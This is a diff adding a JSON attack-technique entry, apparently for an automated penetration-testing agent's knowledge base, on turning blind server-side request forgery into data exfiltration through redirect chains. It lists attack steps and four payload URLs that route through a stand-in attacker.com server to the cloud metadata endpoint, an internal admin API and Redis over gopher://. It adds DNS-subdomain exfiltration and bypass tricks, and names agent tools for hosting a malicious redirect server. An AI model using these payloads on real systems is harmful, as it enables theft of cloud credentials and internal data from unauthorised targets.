@@ -1,0 +1,62 @@
+{
+  "id": "ssrf-redirect-loop-exfiltration",
+  "title": "Blind SSRF to Exfiltration via Redirect Chains",
+  "category": "ssrf",
+  "tags": ["ssrf", "blind-ssrf", "redirect", "exfiltration", "dns-exfiltration", "redirect-chain"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "go", "ruby", "php"],
+    "contexts": ["url-parameter", "webhook-url", "api-endpoint", "pdf-generator"],
+    "preconditions": ["blind-ssrf", "server-follows-redirects"]
+  },
+  "technique": {
+    "summary": "Convert blind SSRF (where response body is not returned) into visible data exfiltration by chaining redirects through an attacker-controlled server. The attacker server redirects the vulnerable server to internal targets, then captures the response via DNS subdomain encoding or redirect-back techniques.",
+    "steps": [
+      "Confirm blind SSRF exists: request attacker-controlled callback server, observe incoming request but no response returned to attacker",
+      "Set up attacker redirect server: host a service that responds with 302/307 redirects to internal targets",
+      "Chain redirect to internal target: SSRF → attacker server → 302 to http://169.254.169.254/latest/meta-data/",
+      "Use 307/308 redirects to preserve HTTP method (POST body forwarded through redirect chain)",
+      "For data exfiltration: redirect back to attacker server with internal response encoded in URL path/query",
+      "DNS exfiltration fallback: encode extracted data as subdomain — http://<extracted-data>.attacker.com",
+      "Chained pagination: walk internal directory listings by iterating redirect targets"
+    ],
+    "payloads": [
+      {
+        "payload": "https://attacker.com/redirect?target=http://169.254.169.254/latest/meta-data/",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Attacker server returns 302 Location: http://169.254.169.254/latest/meta-data/ — use host_payload/serve_malicious_page to set up redirect server"
+      },
+      {
+        "payload": "https://attacker.com/redirect-307?target=http://internal-api:8080/admin",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "307 redirect preserves POST method and body through the chain"
+      },
+      {
+        "payload": "https://attacker.com/dns-exfil?data=${response}",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Redirect server encodes captured response as DNS subdomain query to attacker DNS server"
+      },
+      {
+        "payload": "https://attacker.com/gopher-redirect?target=gopher://internal:6379/_INFO",
+        "encoding": "raw",
+        "context": "url-parameter",
+        "notes": "Redirect to gopher:// scheme for non-HTTP internal service access (Redis, SMTP, etc.)"
+      }
+    ],
+    "bypassTechniques": [
+      "Minimize redirect hop count: some implementations limit redirect depth (commonly 5-10 hops)",
+      "Use 307/308 instead of 301/302 to preserve HTTP method across redirects",
+      "DNS subdomain exfiltration fallback: encode data in subdomain when response body is not forwarded",
+      "Redirect to gopher:// in redirect chain: if server follows scheme changes, access non-HTTP services",
+      "Use host_payload or serve_malicious_page tools to host the redirect chain server",
+      "Fragment-based exfiltration: encode data in URL fragment if server logs include fragments",
+      "Split large responses across multiple DNS queries using chunked subdomain encoding"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/research/top-10-web-hacking-techniques-of-2025"
+  ],
+  "source": "portswigger-top10-2025"
+}
